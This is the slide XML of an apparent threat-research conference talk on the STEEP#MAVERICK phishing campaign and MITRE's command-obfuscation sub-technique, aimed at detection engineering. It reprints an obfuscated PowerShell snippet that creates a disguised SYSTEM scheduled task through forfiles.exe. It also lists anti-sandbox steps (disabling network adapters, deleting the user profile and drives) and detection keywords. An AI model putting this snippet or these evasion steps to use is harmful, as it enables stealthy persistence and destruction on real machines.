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95" r:id="rId2"/>
    <p:sldId id="286" r:id="rId3"/>
    <p:sldId id="297" r:id="rId4"/>
    <p:sldId id="288" r:id="rId5"/>
    <p:sldId id="261" r:id="rId6"/>
    <p:sldId id="262" r:id="rId7"/>
    <p:sldId id="263" r:id="rId8"/>
    <p:sldId id="300" r:id="rId9"/>
    <p:sldId id="258" r:id="rId10"/>
    <p:sldId id="298" r:id="rId11"/>
    <p:sldId id="299" r:id="rId12"/>
    <p:sldId id="267" r:id="rId13"/>
    <p:sldId id="293" r:id="rId14"/>
    <p:sldId id="317" r:id="rId15"/>
    <p:sldId id="301" r:id="rId16"/>
    <p:sldId id="302" r:id="rId17"/>
    <p:sldId id="271" r:id="rId18"/>
    <p:sldId id="291" r:id="rId19"/>
    <p:sldId id="319" r:id="rId20"/>
    <p:sldId id="307" r:id="rId21"/>
    <p:sldId id="303" r:id="rId22"/>
    <p:sldId id="304" r:id="rId23"/>
    <p:sldId id="277" r:id="rId24"/>
    <p:sldId id="312" r:id="rId25"/>
    <p:sldId id="279" r:id="rId26"/>
    <p:sldId id="310" r:id="rId27"/>
    <p:sldId id="314" r:id="rId28"/>
    <p:sldId id="290" r:id="rId29"/>
    <p:sldId id="306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132" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0" snapToObjects="1">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="138" d="100"/>
          <a:sy n="138" d="100"/>
        </p:scale>
        <p:origin x="184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439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Forefiles.exe – known application whitelisting bypass. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>End command – actual “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>deobfuscated</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>” snippet from the final stage payload from STEEP#MAVERICK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7. Counter “File Integrity”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Language = Russian or Chinese</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(this helps a lot with attribution)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CommandInfo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> or Name column fields</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>RestMethod</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>WebRequest</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Invoke-Command</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>WMImethod</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Start-Process</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>…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r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JH Video – How Hackers Hide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2452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>
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Obfuscation for attribution? 🤔</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="EDF3EF"/>
              </a:solidFill>
              <a:latin typeface="Tahoma"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Why is this important? – from a detection engineering standpoint, focusing on behavior – primitives in this case have </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>lasting effects (2022-2026)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rminal window"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="635000" y="660400"/>
            <a:ext cx="10922000" cy="4521200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111614"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2C3531"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="21" name="Title bar rule"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="635000" y="1270000"/>
            <a:ext cx="10922000" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2C3531"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Dot 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="863600" y="901700"/>
            <a:ext cx="127000" cy="127000"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E5534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Dot 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="901700"/>
            <a:ext cx="127000" cy="127000"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2A53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Dot 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1270000" y="901700"/>
            <a:ext cx="127000" cy="127000"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5FB66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600200" y="811401"/>
            <a:ext cx="6465477" cy="30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chemeClr val="bg2"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>tim@detections-ai </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>~ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>ATTACKcon</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>_</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>7.0</a:t>
            </a:r>
            <a:endParaRPr sz="2025" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="82948C"/>
              </a:solidFill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6000" y="1524000"/>
            <a:ext cx="8305800" cy="32537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250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> whoami</a:t>
            </a:r>
          </a:p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250" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>tim.peck</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> — Director of Threat Research, detections.ai</a:t>
            </a:r>
          </a:p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025" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p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250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> cat ./talk-title.txt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPts val="6000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="4800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>AN OBFUSCATED TALE</a:t>
            </a:r>
          </a:p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250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>From ATT&amp;CK Origin to Detection Today </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>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5461000"/>
            <a:ext cx="1061085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93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>MITRE ATT&amp;CK </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>T1027.010</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> — Command Obfuscation, told by one of the researchers </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>who contributed </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2250" b="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>to it</a:t>
            </a:r>
            <a:endParaRPr sz="2250" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="93A89F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39047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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New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400" y="1202055"/>
            <a:ext cx="7335202" cy="650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4650" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3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 PECK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400" y="1993582"/>
            <a:ext cx="733520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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Director of Threat Research, detections.ai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087402"/>
            <a:ext cx="1087755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Co-discoverer, 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STEEP#MAVERICK</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> → contributor, MITRE ATT&amp;CK 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T1027.010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801552"/>
            <a:ext cx="11128664" cy="19370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4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50" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3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sz="2850" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3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campaign exposed the gap. The gap became the sub-technique. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2850" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="EDF3E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ts val="384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50" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3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sz="2850" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3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sub-technique is still active tradecraft in 2026.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7F20A3-2521-4BBB-9364-34E8CCDB973C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="635000" y="1016000"/>
            <a:ext cx="1676400" cy="1701800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A0D0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9A39CD-DE37-7EB2-079E-330C4216A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954722"/>
            <a:ext cx="1676400" cy="1814704"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="28575">
            <a:solidFill>
              <a:srgbClr val="F2A53C"/>
            </a:solidFill>
          </a:ln>
          <a:effectLst>
            <a:glow rad="127000">
              <a:schemeClr val="accent6">
                <a:alpha val="40000"/>
              </a:schemeClr>
            </a:glo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264726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831532"/>
            <a:ext cx="10877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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Section 01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574482"/>
            <a:ext cx="101346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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>STEEP#MAVERICK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2738438"/>
            <a:ext cx="10210534" cy="14029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Eight layers of </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="255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PowerShell</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2550" b="1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obfuscation, counter-forensics that fights back </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2550" b="1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sz="2550" b="1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wildcard invocation pattern that had no name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451032"/>
            <a:ext cx="77914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Courier New"/>
              </a:rPr>
              <a:t>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320" y="4451032"/>
            <a:ext cx="412051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Courier New"/>
              </a:rPr>
              <a:t>Securonix Threat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810" y="4451032"/>
            <a:ext cx="459771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Courier New"/>
              </a:rPr>
              <a:t>European defense contractors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917758"/>
            <a:ext cx="7753350" cy="108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Courier New"/>
              </a:rPr>
              <a:t>phishing → eight-layer chain → ATT&amp;CK gap →</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="2025" b="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr sz="2025" b="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>still alive in 2025–26 → telemetry → Sigma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9355" y="5581650"/>
            <a:ext cx="152209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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New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79355" y="5905500"/>
            <a:ext cx="152209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 err="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Securonix</a:t>
            </a:r>
            <a:endParaRPr sz="2025" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="EDF3EF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64182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2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>STEEP#MAVERICK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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>It Started With a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Phishing Email</a:t>
            </a:r>
            <a:endParaRPr sz="3600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="EDF3EF"/>
              </a:solidFill>
              <a:latin typeface="Tahom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0600" y="1798320"/>
            <a:ext cx="10160000" cy="367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Tahoma"/>
              </a:rPr>
              <a:t>Target: European defense / weapons contractors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751772"/>
            <a:ext cx="10160000" cy="367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Tahoma"/>
              </a:rPr>
              <a:t>Suspected supplier chain: F-35 Lightning II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706178"/>
            <a:ext cx="10160000" cy="391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Tahoma"/>
              </a:rPr>
              <a:t>Delivery: spear-phish → </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>.zip</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> → </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>“Company &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Benefits.lnk</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr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4736782"/>
            <a:ext cx="10160000" cy="367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b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Phishing lure designed to look like a PDF</a:t>
            </a:r>
            <a:endParaRPr sz="2250" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="EDF3EF"/>
              </a:solidFill>
              <a:latin typeface="Tahom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5825" y="5353050"/>
            <a:ext cx="420528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93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>📎 Company &amp; Benefits.lnk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7812" y="5300662"/>
            <a:ext cx="32766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FF6259"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>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1698" y="5353050"/>
            <a:ext cx="404050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93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>📄 Employee Benefits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5876925"/>
            <a:ext cx="136779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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>JUL 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9388" y="5876925"/>
            <a:ext cx="5072062" cy="30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25" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Research: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Securonix</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> advisory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A120EE-0F19-B6F9-6501-1BBCE5594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910" y="52012"/>
            <a:ext cx="3278814" cy="3654166"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:effectLst>
            <a:softEdge rad="152400"/>
          </a:effectLst>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3067941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2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>STEEP#MAVERICK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1236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DF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Not </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3600" b="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>cmd.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3600" b="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>. Not </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3600" b="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>powershell.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3600" b="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3600" b="1">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>forfiles.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3600" b="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma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2424112"/>
            <a:ext cx="106108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Courier New"/>
              </a:rPr>
              <a:t>.lnk</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> → </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>forfiles.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> → PowerShell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3010852"/>
            <a:ext cx="106108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Courier New"/>
              </a:rPr>
              <a:t>powershell.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> copied + renamed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597592"/>
            <a:ext cx="106108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Tahoma"/>
              </a:rPr>
              <a:t>Defeats naive parent-process and filename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711065"/>
            <a:ext cx="22002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Courier New"/>
              </a:rPr>
              <a:t>explorer.exe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6600" y="4711065"/>
            <a:ext cx="304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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New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3328" y="4711065"/>
            <a:ext cx="22002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Courier New"/>
              </a:rPr>
              <a:t>forfiles.exe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052" y="4711065"/>
            <a:ext cx="304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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New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828" y="4549140"/>
            <a:ext cx="3847148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FF6259"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>AdobeAcrobatPDFReader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6259"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>(renamed powershell.exe)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5501640"/>
            <a:ext cx="10877550" cy="9242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29"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2025" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>.(gal ?[?e]x)("$env:???t??r?o?\S*2\??h???k?* -create -f -ru SYSTEM -sc daily -st 09:00 -tn MicrosoftEdgeUpdateSYS -tr '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>forfiles</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> /p %systemroot% /m h\`"h.e\`"xe /c \`"p\`"o\`"w</a:t>
            </a:r>
            <a:endParaRPr sz="2025" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="82948C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0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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>STEEP#MAVERICK · </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Attack Chain Overview</a:t>
            </a:r>
            <a:endParaRPr sz="2025" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F2A53C"/>
              </a:solidFill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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Watching the Chain Unwrap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5391150"/>
            <a:ext cx="10877550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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Each layer decodes the next</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>, all in memory</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>. Nothing is readable until it runs layers 4–6 repeat identically, layer 7 turns hostile, layer 8 finally unlocks.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2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>STEEP#MAVERICK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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Layer 7 - </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>If You're a Sandbox, It Fights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674495"/>
            <a:ext cx="53435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93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>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226945"/>
            <a:ext cx="50768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Screen res &lt; 777px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727008"/>
            <a:ext cx="50768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System age &lt; 3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228022"/>
            <a:ext cx="50768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RAM &lt; 4GB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729038"/>
            <a:ext cx="50768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Tahoma"/>
              </a:rPr>
              <a:t>Language = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>zh</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> / 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230052"/>
            <a:ext cx="50768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Scans for 25+ analysis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7925" y="1674495"/>
            <a:ext cx="53435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FF6259"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>On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226945"/>
            <a:ext cx="50768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Disable network adapters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2727008"/>
            <a:ext cx="50768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Block all firewall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228022"/>
            <a:ext cx="50768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Tahoma"/>
              </a:rPr>
              <a:t>Delete user profile + drives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776662"/>
            <a:ext cx="50768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Courier New"/>
              </a:rPr>
              <a:t>Stop-Computer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3775" y="4415790"/>
            <a:ext cx="364331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82948C"/>
